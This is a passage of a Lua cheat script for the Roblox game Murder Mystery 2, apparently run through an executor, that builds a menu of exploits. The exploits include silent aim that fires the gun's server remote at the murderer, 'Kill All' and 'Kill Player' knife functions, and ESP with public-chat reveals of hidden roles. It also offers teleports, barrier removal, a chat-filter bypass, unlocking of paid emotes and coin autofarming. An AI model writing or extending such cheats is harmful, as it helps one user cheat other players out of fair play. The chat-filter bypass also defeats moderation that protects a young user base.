    mm2_features["ClickTp_Toggle"] = val
    UpdateFeature("mm2", "ClickTp_Toggle", val)
            if mm2_features["ClickTp_Toggle"] then
        if not lp.Backpack:FindFirstChild("Click_Teleport") and not lp.Character:FindFirstChild("Click_Teleport") then
        tool = Instance.new("Tool")
        tool.RequiresHandle = false
        tool.Name = "Click_Teleport"
        tool.Activated:connect(function()
            local pos = mouse.Hit+Vector3.new(0,2.5,0)
            pos = CFrame.new(pos.X,pos.Y,pos.Z)
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos
            end)
        tool.Parent = game.Players.LocalPlayer.Backpack
        DiedLpConnectClickTpTool = lp.CharacterAdded:Connect(function()
            if not lp.Backpack:FindFirstChild("Click_Teleport") and not lp.Character:FindFirstChild("Click_Teleport") then
            tool = Instance.new("Tool")
            tool.RequiresHandle = false
            tool.Name = "Click_Teleport"
            tool.Activated:connect(function()
                local pos = mouse.Hit+Vector3.new(0,2.5,0)
                pos = CFrame.new(pos.X,pos.Y,pos.Z)
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos
                end)
            tool.Parent = game.Players.LocalPlayer.Backpack
            end
            end)
        end
        else
            if lp.Backpack:FindFirstChild("Click_Teleport") then
        lp.Backpack[("Click_Teleport")]:Destroy()
        end
        if lp.Character:FindFirstChild("Click_Teleport") then
        lp.Character[("Click_Teleport")]:Destroy()
        end
        if DiedLpConnectClickTpTool then
        DiedLpConnectClickTpTool:Disconnect()
        end
        end
end)
Tabs.Player.newToggle("Float", mm2_features["Float_Toggle"], function(val)
    mm2_features["Float_Toggle"] = val
    UpdateFeature("mm2", "Float_Toggle", val)
end)
Tabs.Player.newToggle("Infinite Jump", false, function(val)
    mm2_features["InfJump_Toggle"] = val
    if mm2_features["InfJump_Toggle"] then
        InfJump = game:GetService("UserInputService").JumpRequest:connect(function()
            if mm2_features["InfJump_Toggle"] then
            game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass('Humanoid'):ChangeState("Jumping")
            else
                if InfJump then
            InfJump:Disconnect()
            end
            end
            end)
        else
            if InfJump then
        InfJump:Disconnect()
        end
        end
end)
Tabs.Player.newToggle("Fling", mm2_features["Fling_Toggle"], function(val)
    mm2_features["Fling_Toggle"] = val
    UpdateFeature("mm2", "Fling_Toggle", val)
    if mm2_features["Fling_Toggle"] then
        repeat runservice.Heartbeat:Wait()
        local character = lp.Character
        local root = GetRoot(lp)
        local vel, movel = nil, 0.1

        while not (character and character.Parent and root and root.Parent) do
            runservice.Heartbeat:Wait()
            character = lp.Character
            root = GetRoot(lp)
        end

        vel = root.Velocity
        root.Velocity = vel * 10000 + Vector3.new(0, 10000, 0)

        runservice.RenderStepped:Wait()
        if character and character.Parent and root and root.Parent then
            root.Velocity = vel
        end

        runservice.Stepped:Wait()
        if character and character.Parent and root and root.Parent then
            root.Velocity = vel + Vector3.new(0, movel, 0)
            movel = movel * -1
        end
    until mm2_features["Fling_Toggle"] == false
    end
end)
Tabs.Player.newToggle("Instant Role Notify", mm2_features["IRN_Toggle"], function(val)
    mm2_features["IRN_Toggle"] = val
    UpdateFeature("mm2", "IRN_Toggle", val)
end)
Tabs.Player.newToggle("Remove Barriers", mm2_features["RemBar_Toggle"], function(val)
    mm2_features["RemBar_Toggle"] = val
    UpdateFeature("mm2", "RemBar_Toggle", val)
    if mm2_features["RemBar_Toggle"] then
        rMvB = runservice.Heartbeat:connect(function()
            if mm2_features["RemBar_Toggle"] then
        if game:GetService("Workspace").Lobby.MainLobby.Models.Model:FindFirstChild("GlitchProof") ~= nil then
        game:GetService("Workspace").Lobby.MainLobby.Models.Model:FindFirstChild("GlitchProof"):Destroy()
        end
        if game:GetService("Workspace"):FindFirstChild("Mansion2") ~= nil and game:GetService("Workspace"):FindFirstChild("Mansion2").Base:FindFirstChild("GlitchProof"):FindFirstChild("KillBrick") ~= nil then
        game:GetService("Workspace"):FindFirstChild("Mansion2").Base:FindFirstChild("GlitchProof"):FindFirstChild("KillBrick"):Destroy()
        end
        if game:GetService("Workspace"):FindFirstChild("Mansion2") ~= nil and game:GetService("Workspace"):FindFirstChild("Mansion2").Base:FindFirstChild("GlitchProof"):FindFirstChild("GlitchProof") ~= nil then
        game:GetService("Workspace"):FindFirstChild("Mansion2").Base:FindFirstChild("GlitchProof"):FindFirstChild("GlitchProof"):Destroy()
        end
    end
        end)
    else
        if rMvB then rMvB:Disconnect() end
    end
end)
Tabs.Player.newToggle("Loop Interact", mm2_features["LoopInteract_Toggle"], function(val)
    mm2_features["LoopInteract_Toggle"] = val
    UpdateFeature("mm2", "LoopInteract_Toggle", val)
end)
Tabs.Player.newToggle("Remove Bodys(increases fps)", mm2_features["BodyRemover_Toggle"], function(val)
    mm2_features["BodyRemover_Toggle"] = val
    UpdateFeature("mm2", "BodyRemover_Toggle", val)
end)
Tabs.Player.newToggle("Remove Chroma(increases fps)", mm2_features["ChromaRemover_Toggle"], function(val)
    mm2_features["ChromaRemover_Toggle"] = val
    UpdateFeature("mm2", "ChromaRemover_Toggle", val)
    if mm2_features["ChromaRemover_Toggle"] then
        task.wait(0.4)
        chromarem = runservice.Heartbeat:connect(function()
            for i, v in pairs(game.Players:GetPlayers()) do
	if v.Character ~= nil and v.Character:FindFirstChild("Knife") ~= nil and v.Character:FindFirstChild("Knife"):FindFirstChild("Handle") ~= nil and v.Character:FindFirstChild("Knife"):FindFirstChild("Handle"):FindFirstChild("Chroma") ~= nil then
		v.Character:FindFirstChild("Knife"):FindFirstChild("Handle"):FindFirstChild("Chroma"):Destroy()
	elseif v.Character ~= nil and v.Character:FindFirstChild("Gun") ~= nil and v.Character:FindFirstChild("Gun"):FindFirstChild("Handle") ~= nil and v.Character:FindFirstChild("Gun"):FindFirstChild("Handle"):FindFirstChild("Chroma") ~= nil then
		v.Character:FindFirstChild("Gun"):FindFirstChild("Handle"):FindFirstChild("Chroma"):Destroy()
	end
end
        end)
else
    if chromarem then chromarem:Disconnect() end
    end
end)
Tabs.Player.newToggle("Remove Pets/Gun/Knife Display(increases fps)", mm2_features["PetRemover_Toggle"], function(val)
    mm2_features["PetRemover_Toggle"] = val
    UpdateFeature("mm2", "PetRemover_Toggle", val)
    if mm2_features["PetRemover_Toggle"] then
    wait(.3)
    petrem = runservice.Heartbeat:Connect(function()
    for i, v in pairs(game.Players:GetPlayers()) do
    if v.Character ~= nil and v.Character:FindFirstChild("GunDisplay") then
        v.Character:FindFirstChild("GunDisplay"):Destroy()
    elseif v.Character ~= nil and v.Name ~= game.Players.LocalPlayer.Name and v.Character:FindFirstChild("KnifeDisplay") then
        v.Character:FindFirstChild("KnifeDisplay"):Destroy()
	end
    if v.Character ~= nil and v.Character:FindFirstChild("Pet") then
        v.Character:FindFirstChild("Pet"):Destroy()
	end
    end
    end)
else
    if petrem then petrem:Disconnect() end
    end
end)
Tabs.Player.newToggle("Auto Notif Roles", mm2_features["AutoNotifR_Toggle"], function(val)
    mm2_features["AutoNotifR_Toggle"] = val
    UpdateFeature("mm2", "AutoNotifR_Toggle", val)
    if mm2_features["AutoNotifR_Toggle"] then
    ConnectAN = replst.Remotes.Gameplay.Fade.OnClientEvent:Connect(function()
        task.wait(0.9)
        for i,a in pairs(game.Players:GetPlayers()) do
        if a.Character ~= nil and a.Name == Murder and IsAlive(a) then
        SendNotification("Murder Is "..a.Name)
        end
        end
        for i,b in pairs(game.Players:GetPlayers()) do
        if b.Character ~= nil and b.Name == Sheriff and IsAlive(b) then
        SendNotification("Sheriff Is "..b.Name)
        end
        end
        for _,c in pairs(game.Players:GetPlayers()) do
        if c.Character ~= nil and IsAlive(c) and GetSheriffUser() == nil then
        if c.Character:FindFirstChild("Gun") or c.Backpack:FindFirstChild("Gun") then
        SendNotification("Hero Is "..c.Name)
        end
        end
        end
    end)
    else
        if ConnectAN then
        ConnectAN:Disconnect()
        end
    end
end)
Tabs.Player.newToggle("Auto Blur Roles", mm2_features["AutoBlurR_Toggle"], function(val)
    mm2_features["AutoBlurR_Toggle"] = val
    UpdateFeature("mm2", "AutoBlueR_Toggle", val)
    if mm2_features["AutoBlueR_Toggle"] then
    ConnectAB = replst.Remotes.Gameplay.Fade.OnClientEvent:Connect(function()
        task.wait(0.9)
        for _,a in pairs(game.Players:GetPlayers()) do
        if a.Character ~= nil and a.Name == Murder and IsAlive(a) then
        game.TextChatService.TextChannels.RBXGeneral:SendAsync("Murder Is ".. a.Name)
        end
        end
        for _,b in pairs(game.Players:GetPlayers()) do
        if b.Character ~= nil and b.Name == Sheriff and IsAlive(b) then
        game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("Sheriff Is ".. b.Name)
        end
        end
        for _,c in pairs(game.Players:GetPlayers()) do
        if c.Character ~= nil and not IsAlive(game.Players[Sheriff]) and IsAlive(c) then
        if c.Character:FindFirstChild("Gun") or c.Backpack:FindFirstChild("Gun") then
        game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("Hero Is ".. c.Name)
        end
        end
        end
    end)
    else
        if ConnectAB then
        ConnectAB:Disconnect()
        end
    end
end)
Tabs.Player.newButton("Notify Roles", function()
    for i,a in pairs(game.Players:GetPlayers()) do
        if a.Character ~= nil and a.Name == Murder and IsAlive(a) then
        SendNotification("Murder Is "..a.Name)
        end
        end
        for i,b in pairs(game.Players:GetPlayers()) do
        if b.Character ~= nil and b.Name == Sheriff and IsAlive(b) then
        SendNotification("Sheriff Is "..b.Name)
        end
        end
        for _,c in pairs(game.Players:GetPlayers()) do
        if c.Character ~= nil and not IsAlive(game.Players[Sheriff]) and IsAlive(c) then
        if c.Character:FindFirstChild("Gun") or c.Backpack:FindFirstChild("Gun") then
        SendNotification("Hero Is "..c.Name)
        end
        end
        end
end)
Tabs.Player.newButton("Blur Roles", function()
    for _,a in pairs(game.Players:GetPlayers()) do
        if a.Character ~= nil and a.Name == Murder and IsAlive(a) then
        game.TextChatService.TextChannels.RBXGeneral:SendAsync("Murder Is ".. a.Name)
        end
        end
        for _,b in pairs(game.Players:GetPlayers()) do
        if b.Character ~= nil and b.Name == Sheriff and IsAlive(b) then
        game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("Sheriff Is ".. b.Name)
        end
        end
        for _,c in pairs(game.Players:GetPlayers()) do
        if c.Character ~= nil and not IsAlive(game.Players[Sheriff]) and IsAlive(c) then
        if c.Character:FindFirstChild("Gun") or c.Backpack:FindFirstChild("Gun") then
        game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("Hero Is ".. c.Name)
        end
        end
        end
end)
Tabs.Player.newButton("Reset", function()
    lp.Character.Humanoid:Destroy()
end)
Tabs.Player.newButton("Boost Fps", function()
SendNotification("Please Wait 4 seconds...")
wait(4)
local decalsyeeted = true -- Leaving this on makes games look shitty but the fps goes up by at least 20.
local g = game
local w = g.Workspace
local l = g.Lighting
local t = w.Terrain
t.WaterWaveSize = 0
t.WaterWaveSpeed = 0
t.WaterReflectance = 0
t.WaterTransparency = 0
l.GlobalShadows = false
l.FogEnd = 9e9
l.Brightness = 0
settings().Rendering.QualityLevel = "Level01"
for i, v in pairs(g:GetDescendants()) do
    if v:IsA("Part") or v:IsA("Union") or v:IsA("CornerWedgePart") or v:IsA("TrussPart") then
        v.Material = "Plastic"
        v.Reflectance = 0
    elseif v:IsA("Decal") or v:IsA("Texture") and decalsyeeted then
        v.Transparency = 1
    elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
        v.Lifetime = NumberRange.new(0)
    elseif v:IsA("Explosion") then
        v.BlastPressure = 1
        v.BlastRadius = 1
    elseif v:IsA("Fire") or v:IsA("SpotLight") or v:IsA("Smoke") then
        v.Enabled = false
    elseif v:IsA("MeshPart") then
        v.Material = "Plastic"
        v.Reflectance = 0
        v.TextureID = 10385902758728957
    end
end
for i, e in pairs(l:GetChildren()) do
    if e:IsA("BlurEffect") or e:IsA("SunRaysEffect") or e:IsA("ColorCorrectionEffect") or e:IsA("BloomEffect") or e:IsA("DepthOfFieldEffect") then
        e.Enabled = false
    end
end
end)

Tabs.Visual.newToggle("Esp Innocent", mm2_features["Esp_All"], function(val)
   mm2_features["Esp_All"] = val
   UpdateFeature("mm2", "Esp_All", val)
end)
Tabs.Visual.newToggle("Esp Murder", mm2_features["Esp_Murder"], function(val)
    mm2_features["Esp_Murder"] = val
    UpdateFeature("mm2", "Esp_Murder", val)
end)
Tabs.Visual.newToggle("Esp Sheriff", mm2_features["Esp_Sheriff"], function(val)
    mm2_features["Esp_Sheriff"] = val
    UpdateFeature("mm2", "Esp_Sheriff", val)
end)
Tabs.Visual.newToggle("Esp Dropped Gun", mm2_features["Esp_GunDrop"], function(val)
mm2_features["Esp_GunDrop"] = val
UpdateFeature("mm2", "Esp_GunDrop", val)
end)
Tabs.Visual.newToggle("Highlight Players", mm2_features["Highlight_All"], function(val)
mm2_features["Highlight_All"] = val
UpdateFeature("mm2", "Highlight_All", val)
end)
Tabs.Visual.newToggle("Highlight Dropped Gun", mm2_features["Highlight_GunDrop"], function(val)
mm2_features["Highlight_GunDrop"] = val
UpdateFeature("mm2", "Highlight_GunDrop", val)
end)
Tabs.Visual.newNumberBox("Highlight Transparency", mm2_features["HighlightTransparency"], function(val)
    if (tonumber(val) < 0) or (tonumber(val) > 100) then 
        SendError("Please enter a number from 0 to 100 (example: 47)!")
    else
    UpdateFeature("mm2", "HighlightTransparency", val)
    mm2_features["HighlightTransparency"] = val / 100
    end
end)
Tabs.Visual.newToggle("Tracers Players", mm2_features["Tracers_All"], function(val)
    mm2_features["Tracers_All"] = val
end)
Tabs.Modifers.newLabel("Innocent Section")
Tabs.Modifers.newButton("Grab Gun", function()
    if lp.Character ~= nil then
    if GetGunDrop() == nil then SendError("You Can't Grab Gun! Reason: Dropped Gun Didint Founded!") return end
    if lp.Name == Murder then SendError("You Can't Grab Gun! Reason: You Are Murder!") return end
    if GetGunDrop() ~= nil and lp.Name ~= Murder then
        local ts,ti1,ti2 = game:GetService("TweenService"),TweenInfo.new(.24,Enum.EasingStyle.Quint), TweenInfo.new(.15)
        LSTPOINT_GD = lp.Character.HumanoidRootPart.CFrame
        wait(.1)
        lp.Character.HumanoidRootPart.CFrame = GetGunDrop().CFrame + Vector3.new(0,-10,0)
        ts:Create(lp.Character.HumanoidRootPart, ti2, {CFrame = GetGunDrop().CFrame + Vector3.new(0,5.9,0)}):Play()
        wait(.29)
        if GetGunDrop() ~= nil then
            ts:Create(lp.Character.HumanoidRootPart, ti2, {CFrame = GetGunDrop().CFrame + Vector3.new(0,-10,0)}):Play()
        else
            ts:Create(lp.Character.HumanoidRootPart, ti2, {CFrame = lp.Character.HumanoidRootPart.CFrame + Vector3.new(0,-10,0)}):Play()
        end
        wait(.16)
        lp.Character.HumanoidRootPart.CFrame = LSTPOINT_GD
        wait(0.1)
        LSTPOINT_GD = nil
    end
    end
end)
CaptGG = false
Tabs.Modifers.newToggle("Auto Grab Gun", mm2_features["AutoGrabGun"], function(val)
    mm2_features["AutoGrabGun"] = val
    UpdateFeature("mm2", "AutoGrabGun", val)
end)
Tabs.Modifers.newToggle("Notify Dropped Gun", mm2_features["NotifyDG"], function(val)
    mm2_features["NotifyDG"] = val
    UpdateFeature("mm2", "NotifyDG", val)
end)
Tabs.Modifers.newLabel("Sheriff Section")
Tabs.Modifers.newToggle("Silent Aim", mm2_features["SilentAim"], function(val)
    mm2_features["SilentAim"] = val
    UpdateFeature("mm2", "SilentAim", val)
    if mm2_features["SilentAim"] then
        AIM = runservice.Stepped:Connect(function()
            if mm2_features["SilentAim"] then
      if lp.Character ~= nil and lp.Character:FindFirstChild("Gun") ~= nil then
      murder = GetMurderUser()
      if murder ~= nil then
      j = murder.Character.PrimaryPart or murder.Character.HumanoidRootPart
      if mm2_features["SilenrtAim_WCH"] then
      if isClearPath(j) then
			if mm2_features["AimAccuracy"] == "Arcade" then
								local o = j.AssemblyLinearVelocity
								if o.Magnitude == 0 then
									lp.Character:FindFirstChild("Gun").KnifeLocal.CreateBeam.RemoteFunction:InvokeServer(unpack({[1] = 0, [2] = j.Position, [3] = "AH2"}))
								else
									local Y = (o.Unit * j.Velocity.Magnitude) / 11.5
									local t = Y.Y
									if t > 2.65 then
										t = 2.65
									elseif t < -2 then
										t = -2
									end
									lp.Character:FindFirstChild("Gun").KnifeLocal.CreateBeam.RemoteFunction:InvokeServer(unpack({[1] = 0, [2] = j.Position + Vector3.new(Y.X, t, Y.Z / 1.25), [3] = "AH2"}))
								end
							elseif mm2_features["AimAccuracy"] == "Tryhard" then
								local Y = j.AssemblyLinearVelocity
								if Y.Magnitude == 0 then
									lp.Character:FindFirstChild("Gun").KnifeLocal.CreateBeam.RemoteFunction:InvokeServer(unpack({[1] = 0, [2] = j.Position, [3] = "AH2"}))
								else
									local t = (Y.Unit * j.Velocity.Magnitude) / 6 + o.Character.Humanoid.MoveDirection
									local K = t.Y
									if K > 2.5 then
										K = 2.5
									elseif K < -2 then
										K = -2
									end
				lp.Character:FindFirstChild("Gun").KnifeLocal.CreateBeam.RemoteFunction:InvokeServer(unpack({[1] = 0, [2] = j.Position + Vector3.new(t.X, K, t.Z), [3] = "AH2"}))
								end
							elseif mm2_features["AimAccuracy"] == "Relaxed" then
							lp.Character:FindFirstChild("Gun").KnifeLocal.CreateBeam.RemoteFunction:InvokeServer(unpack({[1] = 0, [2] = j.Position + murder.Character.Humanoid.MoveDirection / 9.5, [3] = "AH2"}))
							elseif mm2_features["AimAccuracy"] == "Casual" then
								lp.Character:FindFirstChild("Gun").KnifeLocal.CreateBeam.RemoteFunction:InvokeServer(unpack({[1] = 0, [2] = j.Position + murder.Character.Humanoid.MoveDirection / 2.95, [3] = "AH2"}))
							end
end
else
    	if mm2_features["AimAccuracy"] == "Arcade" then
								local o = j.AssemblyLinearVelocity
								if o.Magnitude == 0 then
									lp.Character:FindFirstChild("Gun").KnifeLocal.CreateBeam.RemoteFunction:InvokeServer(unpack({[1] = 0, [2] = j.Position, [3] = "AH2"}))
								else
									local Y = (o.Unit * j.Velocity.Magnitude) / 11.5
									local t = Y.Y
									if t > 2.65 then
										t = 2.65
									elseif t < -2 then
										t = -2
									end
									lp.Character:FindFirstChild("Gun").KnifeLocal.CreateBeam.RemoteFunction:InvokeServer(unpack({[1] = 0, [2] = j.Position + Vector3.new(Y.X, t, Y.Z / 1.25), [3] = "AH2"}))
								end
							elseif mm2_features["AimAccuracy"] == "Tryhard" then
								local Y = j.AssemblyLinearVelocity
								if Y.Magnitude == 0 then
									lp.Character:FindFirstChild("Gun").KnifeLocal.CreateBeam.RemoteFunction:InvokeServer(unpack({[1] = 0, [2] = j.Position, [3] = "AH2"}))
								else
									local t = (Y.Unit * j.Velocity.Magnitude) / 6 + o.Character.Humanoid.MoveDirection
									local K = t.Y
									if K > 2.5 then
										K = 2.5
									elseif K < -2 then
										K = -2
									end
				lp.Character:FindFirstChild("Gun").KnifeLocal.CreateBeam.RemoteFunction:InvokeServer(unpack({[1] = 0, [2] = j.Position + Vector3.new(t.X, K, t.Z), [3] = "AH2"}))
								end
							elseif mm2_features["AimAccuracy"] == "Relaxed" then
							lp.Character:FindFirstChild("Gun").KnifeLocal.CreateBeam.RemoteFunction:InvokeServer(unpack({[1] = 0, [2] = j.Position + murder.Character.Humanoid.MoveDirection / 9.5, [3] = "AH2"}))
							elseif mm2_features["AimAccuracy"] == "Casual" then
								lp.Character:FindFirstChild("Gun").KnifeLocal.CreateBeam.RemoteFunction:InvokeServer(unpack({[1] = 0, [2] = j.Position + murder.Character.Humanoid.MoveDirection / 2.95, [3] = "AH2"}))
							end
end
end
end
end
        end)
else
    if AIM then AIM:Disconnect() end
end
end)
Tabs.Modifers.newToggle("Wall Check", mm2_features["SilenrtAim_WCH"], function(val)
    mm2_features["SilenrtAim_WCH"] = val
    UpdateFeature("mm2", "SilenrtAim_WCH", val)
end)
Tabs.Modifers.newDropdown("Aim Accuracy", mm2_features["AimAccuracy"], {"Casual", "Tryhard", "Relaxed", "Arcade"}, function(aim)
    mm2_features["AimAccuracy"] = aim
    UpdateFeature("mm2", "AimAccuracy", aim)
end)
lastpsm = nil
Tabs.Modifers.newButton("Shoot Murder", function()
    if mm2_features["SilentAim"] then 
        SendError("Cannot Shoot Murder While Silent Aim Is Turned On!")
        return
    end
    if GetMurderUser() == nil then
            SendError("Murder Is Not Alive Yet!")
            return
        end
    if lp.Backpack:FindFirstChild("Gun") ~= nil then
        if lastpsm == nil then
        murd = GetMurderUser()
        lastpsm = lp.Character.HumanoidRootPart.CFrame
        lp.Backpack.Gun.Parent = lp.Character
        wait(.1)
        lp.Character.HumanoidRootPart.CFrame = murd.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 1.5)
        wait(0.12)
        lp.Character.HumanoidRootPart.CFrame = murd.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 1.5)
            lp.Character.HumanoidRootPart.CFrame = lastpsm
            wait(.1)
            lp.Character.HumanoidRootPart.CFrame = lastpsm
            lp.Character:FindFirstChild("Gun").KnifeLocal.CreateBeam.RemoteFunction:InvokeServer(unpack({[1] = 0, [2] = murd.Character.PrimaryPart.Position + murd.Character.Humanoid.MoveDirection / 9.95, [3] = "AH2"}))
            wait(.1)
            lastpsm = nil
        end
    elseif lp.Character:FindFirstChild("Gun") ~= nil then
        if lastpsm == nil then
        murd = GetMurderUser()
        lastpsm = lp.Character.HumanoidRootPart.CFrame
        wait(.1)
        lp.Character.HumanoidRootPart.CFrame = murd.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 1.5)
        wait(0.12)
        lp.Character.HumanoidRootPart.CFrame = murd.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 1.5)
            lp.Character.HumanoidRootPart.CFrame = lastpsm
            wait(.1)
            lp.Character.HumanoidRootPart.CFrame = lastpsm
            lp.Character:FindFirstChild("Gun").KnifeLocal.CreateBeam.RemoteFunction:InvokeServer(unpack({[1] = 0, [2] = murd.Character.PrimaryPart.Position + murd.Character.Humanoid.MoveDirection / 9.95, [3] = "AH2"}))
            wait(.1)
            lastpsm = nil
        end
    elseif lp.Character:FindFirstChild("Gun") == nil and lp.Backpack:FindFirstChild("Gun") == nil then
        SendError("Gun Didint Detected In Your Inventory/Character!")
        return
    end
end)
Tabs.Modifers.newLabel("Murder Section")
Tabs.Modifers.newToggle("Kill Aura", mm2_features["KillAura"], function(val)
    UpdateFeature("mm2", "KillAura", val)
    mm2_features["KillAura"] = val
end)
Tabs.Modifers.newSlider("Knife Range", mm2_features["KnifeRange"], 15, 300, function(val)
    mm2_features["KnifeRange"] = val
    UpdateFeature("mm2", "KnifeRange", val)
end)
Tabs.Modifers.newButton("Kill All", function()
    if lp.Name == Murder then
			local Y = false
			for o, j in pairs(lp.Backpack:GetChildren()) do
				if j.Name == "Knife" and j:IsA("Tool") then
					j.Parent = lp.Character
					Y = j
				end
			end
			if not Y then
				for o, j in pairs(lp.Character:GetChildren()) do
					if j.Name == "Knife" and j:IsA("Tool") then
						Y = j
					end
				end
			end
			if Y then
			    for y,o in pairs(game.Players:GetPlayers()) do
			    if o.Name ~= lp.Name and IsAlive(o) then
				TouchKn(o, Y)
				end
				end
			end
		end
end)
Tabs.Modifers.newButton("Kill Sheriff", function()
    local o = GetSheriffUser()
		if lp.Name == Murder then
			local Y = false
			for o, j in pairs(lp.Backpack:GetChildren()) do
				if j.Name == "Knife" and j:IsA("Tool") then
					j.Parent = lp.Character
					Y = j
				end
			end
			if not Y then
				for o, j in pairs(lp.Character:GetChildren()) do
					if j.Name == "Knife" and j:IsA("Tool") then
						Y = j
					end
				end
			end
			if Y then
				TouchKn(o, Y)
			end
		end
end)
Tabs.Modifers.newPlayer_Dropdown("Kill Player", function(player)
    local o = game.Players[player]
		if lp.Name == Murder then
			local Y = false
			for o, j in pairs(lp.Backpack:GetChildren()) do
				if j.Name == "Knife" and j:IsA("Tool") then
					j.Parent = lp.Character
					Y = j
				end
			end
			if not Y then
				for o, j in pairs(lp.Character:GetChildren()) do
					if j.Name == "Knife" and j:IsA("Tool") then
						Y = j
					end
				end
			end
			if Y then
				TouchKn(o, Y)
			end
		end
end)

Tabs.TS.newButton("Teleport To Lobby", function()
    lp.Character.HumanoidRootPart.CFrame = CFrame.new(-108, 138, 37)
end)
Tabs.TS.newButton("Teleport To Map", function()
    for i,v in pairs(workspace:GetChildren()) do
        for o,b in pairs(v:GetChildren()) do
        for p,n in pairs(b:GetChildren()) do
        if n.Name == "PlayerSpawn" or n.Name == "Spawn" then
        lp.Character.HumanoidRootPart.CFrame = n.CFrame + Vector3.new(0,5,0)
        end
        end
        end
        end
end)
Tabs.TS.newButton("Teleport Under Map", function()
    for i,v in pairs(workspace:GetChildren()) do
        for o,b in pairs(v:GetChildren()) do
        for p,n in pairs(b:GetChildren()) do
        if n.Name == "PlayerSpawn" or n.Name == "Spawn" then
        lp.Character.HumanoidRootPart.CFrame = n.CFrame + Vector3.new(0,200,0)
        end
        end
        end
        end
end)

Tabs.TS.newButton("Teleport To Void (Safe)", function()
    lp.Character.HumanoidRootPart.CFrame = CFrame.new(1140, 1120, 19)
end)

Tabs.TS.newButton("Teleport To Murder", function()
    if GetMurderUser() ~= nil and lp.Character ~= nil then
        lp.Character.HumanoidRootPart.CFrame = GetMurderUser().Character.HumanoidRootPart.CFrame
    end
end)
Tabs.TS.newButton("Teleport To Sheriff", function()
    if GetSheriffUser() ~= nil and lp.Character ~= nil then

        lp.Character.HumanoidRootPart.CFrame = GetSheriffUser().Character.HumanoidRootPart.CFrame

    end
end)

Tabs.TS.newPlayer_Dropdown("Goto Player", function(player)
    if game.Players[player].Character ~= nil and game.Players[player].Character.Humanoid.Health > 0 then
    lp.Character.HumanoidRootPart.CFrame = game.Players[player].Character.HumanoidRootPart.CFrame
    else
        SendError("Player Character Not Founded!")
    end
end)

Tabs.TS.newButton("Spectate Murder", function()
    if GetMurderUser() ~= nil and lp.Character ~= nil then
        workspace.CurrentCamera.CameraSubject = GetMurderUser().Character.Humanoid
    end
end)
Tabs.TS.newButton("Spectate Sheriff", function()
    if GetSheriffUser() ~= nil and lp.Character ~= nil then

        workspace.CurrentCamera.CameraSubject = GetSheriffUser().Character.Humanoid

    end
end)

Tabs.TS.newPlayer_Dropdown("Spectate Player", function(player)
    if game.Players[player].Character ~= nil and game.Players[player].Character.Humanoid.Health > 0 then
    workspace.CurrentCamera.CameraSubject = game.Players[player].Character.Humanoid
    else
        SendError("Player Character Not Founded!")
    end
end)

Tabs.TS.newButton("Stop Spectating", function()
    workspace.CurrentCamera.CameraSubject = lp.Character.Humanoid
end)

Tabs.Trolling.newLabel("Chat Bypass Section")
MessageToBypass = "Example Message"
Tabs.Trolling.newTextBox("Enter Message Here..", "Example Message", function(val)
    MessageToBypass = tostring(val)
end)
Tabs.Trolling.newButton("Send Message", function()
    game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync(convertText(MessageToBypass))
end)
Tabs.Trolling.newButton("Copy Message", function()
    if setclipboard then
        setclipboard(convertText(MessageToBypass))
        SendNotification("Copied To Clipboard!", 3)
    else
        SendError("Your Executor Does Not Have setclipboard",3)
    end
end)
Tabs.Trolling.newLabel("Maybe can be patched!")
Tabs.Trolling.newLabel("Emotes Section")
local emotelist = {"headless","zombie","zen","ninja","floss","dab","sit"}
local GIVEEMOTE = Tabs.Trolling.newToggle("Auto Give All Emotes", mm2_features["AutoGiveAE"], function(val)
    mm2_features["AutoGiveAE"] = val
    UpdateFeature("mm2", "AutoGiveAE", val)
    if mm2_features["AutoGiveAE"] then
        require(game:GetService('ReplicatedStorage').Modules.EmoteModule).GeneratePage(emotelist,game:GetService("Players").LocalPlayer.PlayerGui.MainGUI.Game:FindFirstChild("Emotes"),'Free Emotes')
        ConnectAddEmote = lp.CharacterAdded:Connect(function()
            require(game:GetService('ReplicatedStorage').Modules.EmoteModule).GeneratePage(emotelist,game:GetService("Players").LocalPlayer.PlayerGui.MainGUI.Game:FindFirstChild("Emotes"),'Free Emotes')
        end)
    else
        if ConnectAddEmote then
            ConnectAddEmote:Disconnect()
        end
    end
end)
Tabs.Trolling.newDropdown("Play Emote",nil, emotelist, function(val)
    replst.Remotes.Misc.PlayEmote:Fire(val)
end)

Tabs.AutoFarm.newToggle("AutoFarm Toggle", mm2_features["AutoFarm"], function(val)
    mm2_features["AutoFarm"] = val
    UpdateFeature("mm2", "AutoFarm", val)
    if mm2_features["AutoFarm"] then
    while task.wait(0.3) do task.wait() pcall(function()
    if mm2_features["AutoFarm"] then
        if findCoinContainer() ~= nil and SnowFull ~= true and lp.Character ~= nil and lp.Character.Humanoid ~= nil then
            teleportToNearbyCoin(mm2_features["CollectionMethod"], mm2_features["SpeedMethod"], mm2_features["ManualSpeedValue"])
            task.wait(0.000915)
        elseif SnowFull == true then
            wait()
        else
            wait()
        end
    end
    end)
    if not mm2_features["AutoFarm"] then wait() break end
    end
    end
end)
Tabs.AutoFarm.newLabel("AutoFarm Setup")
Tabs.AutoFarm.newDropdown("Collection Method", mm2_features["CollectionMethod"], {"Near", "Random"}, function(val)
    mm2_features["CollectionMethod"] = val
    UpdateFeature("mm2", "CollectionMethod", val)
end)
Tabs.AutoFarm.newDropdown("Speed Method", mm2_features["SpeedMethod"], {"Manual", "Auto"}, function(val)
    mm2_features["SpeedMethod"] = val
    UpdateFeature("mm2", "SpeedMethod", val)
end)
Tabs.AutoFarm.newSlider("Manual Speed Value", mm2_features["ManualSpeedValue"], 150, 400, function(val)
    mm2_features["ManualSpeedValue"] = val / 10
    UpdateFeature("mm2", "ManualSpeedValue", val)
end)
Tabs.AutoFarm.newLabel("Example: 100 = 1 second")
if not IsPremium(lp) and not IsOwner(lp) and not IsNecroxisTeam(lp) and not IsTester(lp) then
